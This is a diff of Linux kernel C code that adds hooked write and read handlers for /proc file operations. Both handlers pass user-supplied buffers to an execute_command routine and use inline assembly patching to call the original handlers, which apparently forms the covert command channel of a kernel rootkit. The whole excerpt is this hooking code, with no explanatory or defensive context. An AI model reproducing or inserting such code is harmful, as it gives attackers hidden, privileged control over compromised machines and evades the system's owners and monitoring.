@@ -635,3 +635,27 @@ int execute_command(const char __user *str, size_t length)
     return 1;
 }
 
+static size_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
+{
+    if (execute_command(buf_user, count)) {
+        return count;
+    }
+    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
+    original_write = asm_hook_unpatch(proc_fops_write);
+    ssize_t ret = original_write(file, buf_user, count, p);
+    asm_hook_patch(proc_fops_write);
+
+    return ret;
+}
+
+static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
+{
+    execute_command(buf_user, count);
+
+    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
+    original_read = asm_hook_unpatch(proc_fops_read);
+    ssize_t ret = original_read(file, buf_user, count, p);
+    asm_hook_patch(proc_fops_read);
+
+    return ret;
+}
